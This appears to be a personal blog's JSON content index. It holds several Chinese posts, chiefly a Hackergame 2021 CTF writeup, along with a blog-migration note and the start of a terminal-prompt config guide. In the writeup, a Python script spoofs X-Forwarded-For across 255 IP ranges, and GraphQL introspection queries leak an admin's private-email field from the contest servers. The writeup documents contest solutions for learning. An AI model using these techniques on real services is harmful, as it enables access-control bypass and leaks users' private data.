groups_positions_common_sumweek: preprocess_groups_position(groups_positions_common_sumweek[i]) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 fig, ax = plt.subplots(7, 1, sharex=False, sharey=True, figsize=(15, 70)) fig.set_facecolor(\u0026#39;white\u0026#39;) label_extra_list = [\u0026#39;Wed\u0026#39;, \u0026#39;Thur\u0026#39;, \u0026#39;Fri\u0026#39;, \u0026#39;Sat\u0026#39;, \u0026#39;Sun\u0026#39;, \u0026#39;Mon\u0026#39;, \u0026#39;Tue\u0026#39;] unsc_order = [5, 6, 0, 1, 2, 3, 4] for i_, i in enumerate(unsc_order): ax[i_].set_title(f\u0026#34;{label_extra_list[i]} 4a.m.-7a.m. hot scatter plot\u0026#34;) ax[i_].set_xlabel(\u0026#39;longitude\u0026#39;) ax[i_].set_ylabel(\u0026#39;latitude\u0026#39;) step = 0.01 x_index = [f\u0026#34;{i + step / 2:.3f}\u0026#34; for i in cutinto_longitude[:-1]] y_index = [f\u0026#34;{i + step / 2:.3f}\u0026#34; for i in cutinto_latitude[:-1]] for i_, i in enumerate(unsc_order): ax[i_].scatter([i for i in x_index for _ in range(len(y_index))], y_index * len(x_index), s=groups_positions_common_sumweek[label_extra_list[i]], alpha=0.5) fig.savefig(\u0026#39;./7天数据早高峰4-7am集中热力图\u0026#39;, dpi=200, bbox_inches=\u0026#39;tight\u0026#39;) 结语 不得不说，数学建模，一如既往地，刺激。\n整个初赛就三天，第一天整思路，有可能第二天也在整思路，前期做一些数据 describe 不是很复杂。然后到后面有思路了，这个思路实现起来还不是那么容易，这种坐标型数据和时间序列摆一起的又特别复杂，写程序的还必须保证算法可靠性，非常辛苦。\n总的来说，压力虽然大，也只拿了优秀奖，但是我还是挺乐在其中的。不管是在团队合作还是个人实力上都有提升。\n写这篇文章写得真是太晚了！不过能补上就是好事。\n近期应该会多写点博文。\n","date":"2021-11-21T09:31:13+08:00","permalink":"https://blog.tinyume.com/2021/tzmcm-2021/","title":"TZMCM 2021 比赛代码"},{"content":"Overlook 比赛时间：北京时间 2021 年 10 月 23 日 中午 12:00 ～ 10 月 30 日 中午 12:00（共七天） 赛制：个人线上赛，解题模式，约 25 道题目，有实时排行榜。\n比赛题目分为 4 类，分类如下：\n综合技能（general） 程序逆向与漏洞利用（binary） 密码学与数学（math） 网站安全（web） 当前分数：1400， 总排名：236 / 2677\nbinary：150 ， general：650 ， math：0 ， web：600\nPreface 今年比 去年 高了 500 分，但是 \u0026ldquo;简单题\u0026rdquo; 的难度明显比去年高，难度梯度更小（平均）了。\n文章已发表于 选手题解\n题目 1. 签到 类型: web\n耗时: 20s\n进入网页，首先点一下 next，发现 url 变成了 http://202.38.93.111:10000/?page=1。马上可以想到 query parameter page 是时间戳。\n直接进入 Python Interpreter，执行\n1 2 3 \u0026gt;\u0026gt;\u0026gt; import time \u0026gt;\u0026gt;\u0026gt; time.time() 1635489757.9277494 此时不知道时间戳是 9 位还是 13 位的，但是先把 9 位的拿上去试试。\nexp: http://202.38.93.111:10000/?page=1635489757\n得到 flag{HappyHacking2021-a95dcfa4bd}\n2. 进制十六 \u0026ndash; 参上 类型: general\n耗时: 2min\nhex to ascii，搞定！\n时间主要花费在把图里的 hex 一个个手动提取出来了。\n打开解释器\n1 2 3 4 \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join([chr(i) for i in (0x7b,0x59,0x30,0x55,0x5f,0x53,0x48,0x30,0x55,0x31,0x44,0x5f,0x6b,0x6e,0x30,0x77,0x5f,0x48,0x30,0x57,0x5f,0x74,0x30,0x5f,0x43,0x30,0x6e,0x76,0x33,0x72,0x74,0x5f,0x48)]) \u0026#39;{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_H\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026#39;.join([chr(i) for i in (0x45,0x58,0x5f,0x74,0x6f,0x5f,0x54,0x65,0x78,0x54,0x7d,0x20,0x46,0x6f,0x72)]) \u0026#39;EX_to_TexT} For\u0026#39; flag{Y0U_SH0U1D_kn0w_H0W_t0_C0nv3rt_HEX_to_TexT}\n3. 去吧！追寻自由的电波 类型: general\n耗时: inf\nAudacity 拖入音频，观察波形发现没啥特征。\n题目提到了 \u0026ldquo;使得最终接受到的录音的速度有所改变\u0026rdquo;，可以说明音频文件的速度是不正确的。\n将采样率下调，当调为 16000Hz 时，可以听出来了一些很清晰的英文单词，然后直接导出。\n将听到的单词提取出来分组，就可以得到 foxtrot, leaner, alpha, golf, left bracket, proper, hotel, ostreet, november, echo, tango, india, charlie, alpha, brago, right bracket\nleft bracket 和 right bracket 对应 flag 的两个花括号。left bracket 前面四个单词提取首字母就是 flag，因此推测将括号内的单词取首字母就是 flag 的主体了。\nflag{phoneticab}\n第一天脑袋卡住了，第二天才想出此题的解法。\n4. 猫咪问答 Pro Max 类型: general\n耗时: 20min\n2017 年，中科大信息安全俱乐部（SEC@USTC）并入中科大 Linux 用户协会（USTCLUG）。目前，信息安全俱乐部的域名（sec.ustc.edu.cn）已经无法访问，但你能找到信息安全俱乐部的社团章程在哪一天的会员代表大会上通过的吗？\n看到此题第一时间想到 https://web.archive.org/\n答案: 20150504\nRef: https://web.archive.org/web/20181004003308/http://sec.ustc.edu.cn/doku.php/codes\n中国科学技术大学 Linux 用户协会在近五年多少次被评为校五星级社团？\n保留此题。\n中国科学技术大学 Linux 用户协会位于西区图书馆的活动室门口的牌子上“LUG @ USTC”下方的小字是？\n答案: Development Team of Library\nRef: https://news.ustclug.org/2016/06/new-activity-room-in-west-library/\n在 SIGBOVIK 2021 的一篇关于二进制 Newcomb-Benford 定律的论文中，作者一共展示了多少个数据集对其理论结果进行验证？\n答案: 13\nRef: http://sigbovik.org/2021/proceedings.pdf\n不严格遵循协议规范的操作着实令人生厌，好在 IETF 于 2021 年成立了 Protocol Police 以监督并惩戒所有违背 RFC 文档的行为个体。假如你发现了某位同学可能违反了协议规范，根据 Protocol Police 相关文档中规定的举报方法，你应该将你的举报信发往何处？\n答案: /dev/null\nRef: https://www.rfc-editor.org/rfc/rfc8962.html#section-6\n（别啥都往 /dev/null 塞啊 kora\n最后，5 题有 4 题解出来了，剩 1 题可简单遍历，那么直接打开 hackbar 是最快的。此题没有任何遍历脚本。\n和往年一样，此题考察搜索引擎的使用，还是挺不错的，出题比去年好一点。\nflag{8804d9f3_7320de5724}\n5. 卖瓜 类型: web\n耗时: 1h\n严格来说不算 web 题。偏 misc。\n首先 f12，发现 input 设置了 min，给它改成 -1 并把 value 设为 -1，提交后跳转到一个纯文本页面: 操作无效：不能放负数个瓜。点击这里回到主页。\n然后尝试把 type 改成 text，依次输入 -1, 1+1, 1.5, '1'.'1' 发现都没有得到预期行为，因此 value 的简单 payload 是行不通的。\n然后注意到 input 框的命名是 b6, b9 的形式，那尝试改成 b2 或者其他数字是否能提交不同斤数的瓜，提交后 trackback 马上显示了出来。\n1 2 3 Warning: Undefined array key \u0026#34;b6\u0026#34; in /mnt/app/index.php on line 63 Warning: Cannot modify header information - headers already sent by (output started at /mnt/app/index.php:63) in /mnt/app/index.php on line 69 比赛第一天我以为这是 php 代码漏洞注入题，然后就没做了。\n比赛第二天题目解的都差不多了，实在没有题可以解了。回来看这题的时候，随便输了几个大数字，然后发现，我超，原来有 overflow！\n（下面以 b6 代指 6 斤瓜，b9 代指 9 斤瓜）\n仔细摸索了一下，可以发现\n电子枰上的数字是 bigint b6 合算斤数高于 int64 会被当成 0 b9 输入为 1024819115206086200 时，电子枰正确地加上了 9223372036854775800 斤；而输入高于上面这个值，也就是合算斤数高于 int64 时，值会突然变成 -9223372036854775808 并且保持不变 -9223372036854775808 并不被 6 或 9 整除\n理解到这一步，后面的步骤就很简单了\n在 b9 框输入个很大的数先把 -9223372036854775808 这个数字弄出来，然后在 b6 或 b9 构造合算斤数不超过 int64 的数字加在上面的负的斤数上。\n拿 b9 举例，我在 b9 输入 1024819115206086200 提交，然后电子枰读数就变成了 -8/20 斤。重复以上步骤，得到 -16/20 斤。36 % 6 = 0，直接拿 6 个 b6 加在电子枰上就完成了此题。\nflag{HUAQIANG!HUAQIANG!_78b45b2322}\n6. 透明的文件 类型: general\n耗时: 30min\n打开文件，大概长下面这样，行数 1，有 17590 个字符。\n1 [0;0H[20;58H[8;34H[13;27H[4;2H[38;2;1;204;177m [39m[14;10H[20;51H[23;4H[12;2H[38;2;2;207;173m [39m[19;61H[9;12H[22;8H[20;2H[38;2;3;210;169m [39m[3;23H[8;68H[19;10H[4;3H[38;2;4;214;165m 作为一个熟悉 Linux 的人不可能不知道上面这个是什么，所以我一眼认出来了这是 bash colorize prompt 的配置内容，也称为 ANSI 转义序列\n不知道的人可以看 这里\n之前我写过 oh-my-posh 的 终端美化，而在这之前我都是使用原始的 PS1 来控制 prompt 的。\n了解文件内容:\n一个颜色标识符应该形如 \\e[\u0026lt;color code\u0026gt;m，而颜色的结束标识符为 \\e[39m\n一个光标跳转标识符应该形如 \\e[\u0026lt;row\u0026gt;,\u0026lt;column\u0026gt;H，表示将光标移动到 \u0026lt;row\u0026gt; 行、\u0026lt;column\u0026gt; 列\n再看源文件，显然缺少了 \\e 这个前缀；没有看到 set background 的代码，那么就把 \u0026lt;space\u0026gt; 换成可辨识字符即可。\n文件修复:\n将 [ 全部替换为 \\e[ 或者 \\003[ 将 \u0026lt;space\u0026gt;（空格） 全部替换为 # 文件修好啦。进入 shell\n1 nano ~/.bashrc ^w 搜索 export ps1，或者在最后一行添加 export PS1=\u0026quot;\u0026quot;\n如果原来有内容的话，建议注释掉而不要删除，以免引发混乱。\n把修复好的文件内容全部复制到双引号内，保存退出。\n执行\n1 2 source ~/.bashrc clear 题目给了提示，内容全是小写字母，那么就是 flag{abxnniohkalmcowsayfiglet}\n7. 旅行照片 类型: general\n耗时: inf\n没有解出。但是思路是有的。\n就是图像变换，利用图像变换把不太明显的信息凸显出来。\n但是我无法理解的是为什么有 800 多号人做了出来（\n作为一个 150 分值的题目，这是不合理的。\nedit: 看了官方 wp，真简单（\n8. FLAG 助力大红包 类型: general\n耗时: 2h\n此题常规思路是绕过 ip 验证，只要绕过了就可以构造任意 ip 助力大红包。\n非常规解法: 如果你或者你认识的人在 /8 每个子网都有代理机，包括 0.0.0.0/8（懂不懂什么叫人脉啊？），那你可以用最快（x）的方式结束此题。\n回到常规解法，首先 f12 看助力按钮\n1 2 3 4 \u0026lt;form class=\u0026#34;form-inline\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;ip\u0026#34; id=\u0026#34;ip\u0026#34;\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-danger ml-2\u0026#34;\u0026gt;点击按钮，为您的好友助力\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; 可以得知点击按钮的时候，页面 post 了当前 ip，这是前端验证。\n前端验证的绕过方法很简单，打开 hackbar，构造 Post data ip=1.1.1.1，执行后弹出警告 失败！检测到前后端检测 IPv4 地址不匹配，前端地址： 1.1.1.1 ，后端地址： 111.27.47.10 。疑似地址伪造！。从这个 \u0026ldquo;温情提示\u0026rdquo; 可以看出前端成功绕过了。\n接下来绕过后端验证，首先尝试伪造 http header，此处可以伪造的只有 X-Forwarded-For。这个 header 的作用是在代理访问时保留自己的源 ip 供服务器识别。\n在 hackbar 选择 Add Header，添加 X-Forwarded-For: 1.1.1.1，Post data ip=1.1.1.1\n得到回显: 助力成功！您的 IPv4 地址是： 1.1.1.1 ，成功共同打造世界一流大砍刀！\n绕过很简单，不是么？\n活动规则提到了 活动要求位于同一 /8 网段的用户将会被视为同一个用户，而 /8 网段对应掩码 255.0.0.0，表示共有 255 个子网，需要请求 255 次，显然手工在 10min 内完成是不可能的，也不方便解题。\n于是尝试写请求脚本。payload 就是伪造的 ip pool\n首先需要测试请求间隔，间隔过短的话请求会被拒绝，最后得出的间隔为 1s\n然后是对于助力成功的判断、对助力重复的判断，这两种情况都要把 ip 从 ip pool 移除\nresponse status_code 都是 200，显然不能从这里判断，那么只能从文本回显来判断了。\n回显有如下 4 种\n助力成功！您的 IPv4 地址是： 0.1.1.1 ，成功共同打造世界一流大砍刀！ 失败！重复的 /8 地址： 1.1.1.1 。 失败！操作速度太快了，请稍后再试！ 下面是我写的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import requests # type: ignore from time import sleep from ipaddress import IPv4Address url = \u0026#39;http://202.38.93.111:10888/invite/2a1abf61-fb9b-456d-bac7-1e14e138e2b2\u0026#39; f_ip = \u0026#39;{}.1.1.1\u0026#39; ip_set = {*()} for i in range(1, 256): ip = f_ip.format(i) ip_set.add(ip) while ip_set: for ip in ip_set.copy(): sleep(1) response = requests.post(url, data={\u0026#39;ip\u0026#39;: str(ip)}, headers={\u0026#39;X-Forwarded-For\u0026#39;: str(ip)}) content = response.content.decode() if \u0026#39;助力成功\u0026#39; in content or \u0026#39;重复\u0026#39; in content: ip_set.remove(ip) continue print({i.split(\u0026#39;.\u0026#39;, 1)[0] for i in ip_set}) print(f\u0026#39;剩余 ip 数量: {len(ip_set)}\u0026#39;) 但是执行完毕发现 flag 并没有达到 1，但是很接近了，可能缺的只有 1 个 ip。\n直接 hackbar 请求，找到了漏网的 ip 0.1.1.1\n至此 256 个助力完成了（成功打造世界一流大砍刀）\nflag{r3d-enve10p3-9df0e42771}\n9. Amnesia 类型: binary\n9.1 轻度失忆 耗时: 30min\n时间大多花在了阅读 ELF 文件结构\n源代码编译时，字符串这样的常量（只读数据）会被存储在 .rodata 内，而分配了空间的变量会被存储在 .data 内，像是 extern 这种不分配空间的符号是没有占用的，.text 存储的是表达式之类的东西。\n而此题提到 .rodata 和 .data 段都会被清除，那么目的就是不使用字符串常量和变量来输出 Hello world!\n先编写一个简单的程序\n1 2 3 4 5 6 #include \u0026#34;stdio.h\u0026#34; int main() { printf(\u0026#34;Hello, world!\u0026#34;); return 0; } gcc -o helloworld helloworld.c 编译出可执行文件\nobjdump -s helloworld 查看 ELF 文件结构\n然后看下结构内的 .rodata 段\n1 2 3 Contents of section .rodata: 2000 01000200 48656c6c 6f20776f 726c6421 ....Hello world! 2010 00 . 看到了 Hello world!，意料之内。\n然后尝试编写\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026#34;stdio.h\u0026#34; int main() { putchar(\u0026#39;H\u0026#39;); putchar(\u0026#39;e\u0026#39;); putchar(\u0026#39;l\u0026#39;); putchar(\u0026#39;l\u0026#39;); putchar(\u0026#39;o\u0026#39;); putchar(\u0026#39;,\u0026#39;); putchar(\u0026#39; \u0026#39;); putchar(\u0026#39;w\u0026#39;); putchar(\u0026#39;o\u0026#39;); putchar(\u0026#39;r\u0026#39;); putchar(\u0026#39;l\u0026#39;); putchar(\u0026#39;d\u0026#39;); putchar(\u0026#39;!\u0026#39;); return 0; } 编译可执行然后看 .rodata\n1 2 Contents of section .rodata: 2000 01000200 .... 很好！没有 Hello world! 了。\n把代码送上网页终端，得到 flag{S0_S1mp1e_r1ght_5d6537dcc8}\n9.2 记忆清除 没做，识趣地离开了。\n10. 图之上的信息 类型: web\n耗时: 2h\n我觉得是今年 hackergame 最有意思的一道题了，寓教于乐。\n首先看看啥是 GraphQL\n以及请求一个 GraphQL API 的 方法\n再仔细翻看 GraphQL 文档，可以发现这么一个 特殊的页面。它提到了如何查询内部数据库的信息，根据这个页面首先尝试一下请求所有的 Type\n下面的请求 Url 都是 http://202.38.93.111:15001/graphql\n打开 Postman\n注意，你首先得访问 http://202.38.93.111:15001/?token=\u0026lt;your token\u0026gt; 获取 cookie 才能使用 query\n我这里使用 POST 的请求方法，你也可以使用 GET，无所谓\n构造 Body，选择 json\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{__schema{types{name}}}\u0026#34; } 然后发送 POST 请求\n回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;types\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;GNote\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Int\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;GUser\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;Boolean\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__Schema\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__Type\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__TypeKind\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__Field\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__InputValue\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__EnumValue\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__Directive\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;__DirectiveLocation\u0026#34; } ] } } } 发生了什么？这些返回是啥啊？？\nGraphQL 设计了类型系统，一切皆为类型，一个 API 查询由简单类型构成，也可以由嵌套类型构成，但类型的字段最终分为基本 Int, String, Boolean。\n上面的 payload 获取的就是所有的 type，其中包含了很多 GraphQL 内置的类型可以忽略。其中对我们有用的信息只有形如 GNote, GUser 这样的类型名字。\n知道了类型名字后就可以查询 GUser 这个类型的字段有哪些了。\n构造 Body\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{__type(name:\\\u0026#34;GUser\\\u0026#34;){name fields{name type{name}}}}\u0026#34; } 回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { \u0026#34;data\u0026#34;: { \u0026#34;__type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;GUser\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;id\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Int\u0026#34; } }, { \u0026#34;name\u0026#34;: \u0026#34;username\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34; } }, { \u0026#34;name\u0026#34;: \u0026#34;privateEmail\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;String\u0026#34; } } ] } } } 于是我们知道了 GUser 的 schema，将其简记为\n1 2 3 4 class GUser: id: int username: str privateEmail: str 光知道类型还不够，接下来还得知道有哪些东西是可以查询的。\n就像 types 内置在 __schema 内，__schema 也包含一个字段叫做 queryType，用于查询可用 query。不过这个 queryType 实际上是个名为 Query 的类型，也就是说使用 __type 也可以查询到它的字段。\n构造 Body\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{__type(name:\\\u0026#34;Query\\\u0026#34;){name fields{name type{name}}}}\u0026#34; } 或者\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{__schema{queryType{name fields{name type{name} description}}}}\u0026#34; } POST，得到回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;data\u0026#34;: { \u0026#34;__schema\u0026#34;: { \u0026#34;queryType\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;Query\u0026#34;, \u0026#34;fields\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;note\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;GNote\u0026#34; }, \u0026#34;description\u0026#34;: \u0026#34;Get a specific note information\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;notes\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: null }, \u0026#34;description\u0026#34;: \u0026#34;Get notes information of a user\u0026#34; }, { \u0026#34;name\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;type\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;GUser\u0026#34; }, \u0026#34;description\u0026#34;: \u0026#34;Get a specific user information\u0026#34; } ] } } } } 知道了 query name，就可以构造用户查询 payload 了。不过注意这个查询是 Get a specific user information，也就是说 argument 是至少需要一个的，否则会返回 NoneType，但是此时我们不知道这个 queryType 有啥 argument，我们知道的只有示例的 username\n尝试构造 Body\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{user(username:Guest){username,privateEmail}}\u0026#34; } 回显\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 { \u0026#34;errors\u0026#34;: [ { \u0026#34;message\u0026#34;: \u0026#34;Unknown argument \u0026#39;username\u0026#39; on field \u0026#39;Query.user\u0026#39;.\u0026#34;, \u0026#34;locations\u0026#34;: [ { \u0026#34;line\u0026#34;: 1, \u0026#34;column\u0026#34;: 7 } ], \u0026#34;path\u0026#34;: null } ] } 那么换个 argument 试试\n尝试构造 Body\n1 2 3 { \u0026#34;query\u0026#34;: \u0026#34;{user(id:1){username,privateEmail}}\u0026#34; } 回显\n1 2 3 4 5 6 7 8 { \u0026#34;data\u0026#34;: { \u0026#34;user\u0026#34;: { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;privateEmail\u0026#34;: \u0026#34;flag{dont_let_graphql_l3ak_data_9f34dccd08@hackergame.ustc}\u0026#34; } } } 搞定！flag{dont_let_graphql_l3ak_data_9f34dccd08@hackergame.ustc}\n12. 加密的 U 盘 类型: general\n耗时: None\n没解出来，但是看了 wp 大受震撼。\n13. 赛博厨房 类型: general\n13.1 Level 0 耗时: 5min\n很简单，直接给 payload\n1 2 3 4 5 6 7 8 9 10 11 向右 2 步 拿起 1 个物品 向下 1 步 向左 2 步 放下 1 个物品 向上 1 步 向右 1 步 拿起 1 个物品 向下 1 步 向左 1 步 放下 1 个物品 13.2 Level 1 耗时: 20min\n先看看有多少个 0\n1 2 \u0026gt;\u0026gt;\u0026gt; len([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]) 73 payload 就是\n1 2 3 4 5 6 向右 1 步 拿起 73 个物品 向下 1 步 向左 1 步 放下 1 个物品 如果手上的物品大于等于 1 向上跳转 1 行 值得一提的是 如果手上的物品大于等于 n 向上跳转 m 行 表示的是一个 if-goto 语句，把当前执行权交给向上 m 行的代码，再向下执行。\n13.3 / 13.4 没做\n总结 截止至 2021-10-30 01:31:06，排名为 236 / 2677\n解题时间的消耗明显比去年短了，今年是从 2021-10-23 晚上开始 CTF，得到了 5 个 flag，于 2021-10-24 获取了能力范围内的所有 flag，后面就没做了，两天完成了这篇博文的所有解题。\n能解出来的题目也比去年多了，有了那种得心应手的感觉。（被其他 CTF 比赛虐死的菜鸡的自述）\n今年的题目做起来真的挺开心的，明年应该也会参加。\nmath 题今年也是一分没拿，明年争取一下吧。（虽然买了基本操作密码学但是看不懂的菜鸡怎么可能会手算因数呢？）\n贴图不多，主要是图床管理太烂了，又没时间自己写\n","date":"2021-10-29T12:54:22+08:00","permalink":"https://blog.tinyume.com/2021/hackergame2021-writeup/","title":"Hackergame 2021 Writeup"},{"content":"What is new? 启用 hugo-theme-stack\n在逛 hugo 主题时，第一页就看中了这个，后面的都没翻了。然后 Jimmy 这个开发者我也有所耳闻，所以就采用了这个主题。汉字优化和配色其实不如原来的主题（不过我也不知道网页汉字咋优化）\n夜间模式\n更好的 SEO\n原本的 SEO 和没有一样，所以这个还算好的。\n更小的资源加载\nWhat is deprecated? 弃用 hexo-theme-material\n当时本地的 material 主题自从原作者 viosey 停止维护后便没有更新了（即便后面有了别人接手），接近两年的修修补补，然后凑合着写了两年博文，如今觉得是时候和这个主题告别了。再见！\n关闭评论区\n等啥时候有个我感觉顺手好用的评论管理工具，或者我自己写完评论区，到时候再开启评论。其实我还考虑过要不要关闭友链，我觉得这玩意很功利主义，想了很久还是不关闭友链了。\n如果你在阅读本博客时发现了技术性错误或者误导内容，欢迎私信我。\nGoogle Analytics\n早就想关了，数据不准确，谷家还黑心。之前看到有个开源的代替方案，但是不太想搞了。\nURI pattern\n旧的 article uri 模式舍弃。采用 https://\u0026lt;domain\u0026gt;/\u0026lt;year\u0026gt;/\u0026lt;article-urlsafe\u0026gt;/ 作为新的模式。因此旧文章的链接全部都会挂掉。如果你发现一篇文章可以搜索到但是链接 404，那大概率不是我删了那篇文章，你可以尝试 搜索。\nFuture 来说个可能大家都关心的，半年没更新博客了的原因。\n虽然平时自己私下有写些东西，但是相比以前高中的时候，写博文并发表这件事情本身好像对我没有什么吸引力了，也就是说我觉得自己没有动机去发任何一篇博文。而且自己平时写作的文字量也是少得可怜。\n看了看好友的博文，虽然都是自我向的，但是写得很好，他和我说博文就是写给自己看的。所以我想要寻找自己写博文的方向是什么。写科普技术博文其实不一定有人看，所以我很少写的，以往博文里写的多的技术相关的都是 writeup、一些提高生产力的工具分享。但是写日常文吧，如果是文学性的还好，写得乐自己感觉好就行了，如果是那种个人想法，就不得不考虑自己写的东西是否涉及他人的利益，其实很难说会不会有影响，所以最好还是少写点好。\n———— 所以我咕了半年的理由是？不会就上面这些吧？\n好吧，实话实说吧，理由就是懒，连构思都懒得做，都懒成一只猫了，不对，也许我只是戴上了猫的面具，虽然我并不想哭，但也许我还是有那么点个性的。\n不过如果这就是我的个性的话，那咕咕咕也挺正常的不是么？ww\n","date":"2021-10-24T10:10:10+08:00","permalink":"https://blog.tinyume.com/2021/hugo-new-beginning/","title":"Hello Hugo!"},{"content":"前言 默认 bash 难配置，zsh 功能强大但尺寸大易卡顿，fish 虽算是一个优良的 shell，但它并不遵循 POSIX。\n并且由于 oh-my-posh 伴随了我两年多，所以最终选择了 oh-my-posh 来写个性化终端。实际上参照官方文档和示例来写一个配置并不难，我写完下面的示例文件也只用了一个多钟，所以最终能用上一个称手的终端还是挺舒服的。\n适用于 oh-my-posh (bash) windows powershell, linux most distro, macos 从示例开始 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 { \u0026#34;$schema\u0026#34;: \u0026#34;https://raw.githubusercontent.com/JanDeDobbeleer/oh-my-posh/main/themes/schema.json\u0026#34;, \u0026#34;blocks\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;newline\u0026#34; }, { \u0026#34;type\u0026#34;: \u0026#34;rprompt\u0026#34;, \u0026#34;alignment\u0026#34;: \u0026#34;right\u0026#34;, \u0026#34;segments\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;time\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#007ACC\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;postfix\u0026#34;: \u0026#34;\u0026#34; } } ] }, { \u0026#34;type\u0026#34;: \u0026#34;prompt\u0026#34;, \u0026#34;alignment\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;segments\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;session\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#FFFFFF\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;user_info_separator\u0026#34;: \u0026#34; \u0026lt;#b0bec5\u0026gt;on\u0026lt;/\u0026gt; \u0026#34;, \u0026#34;prefix\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;postfix\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;user_color\u0026#34;: \u0026#34;#00e676\u0026#34;, \u0026#34;host_color\u0026#34;: \u0026#34;#7c4dff\u0026#34; } }, { \u0026#34;type\u0026#34;: \u0026#34;os\u0026#34;, \u0026#34;style\u0026#34;: \u0026#34;plain\u0026#34;, \u0026#34;foreground\u0026#34;: \u0026#34;#26C6DA\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;macos\u0026#34;: \u0026#34;\\ue711\u0026#34;, \u0026#34;linux\u0026#34;: \u0026#34;\\ue712\u0026#34;, \u0026#34;wsl\u0026#34;: \u0026#34;wsl\u0026#34;, \u0026#34;wsl_separator\u0026#34;: \u0026#34; \u0026#34;, \u0026#34;windows\u0026#34;: \u0026#34;\\ue70f\u0026#34;, \u0026#34;display_distro_name\u0026#34;: false, \u0026#34;alpine\u0026#34;: \u0026#34;\\uf300\u0026#34;, \u0026#34;arch\u0026#34;: \u0026#34;\\uf303\u0026#34;, \u0026#34;centos\u0026#34;: \u0026#34;\\uf304\u0026#34;, \u0026#34;debian\u0026#34;: \u0026#34;\\uf306\u0026#34;, \u0026#34;elementary\u0026#34;: \u0026#34;\\uf309\u0026#34;, \u0026#34;fedora\u0026#34;: \u0026#34;\\uf30a\u0026#34;, \u0026#34;gentoo\u0026#34;: \u0026#34;\\uf30d\u0026#34;, 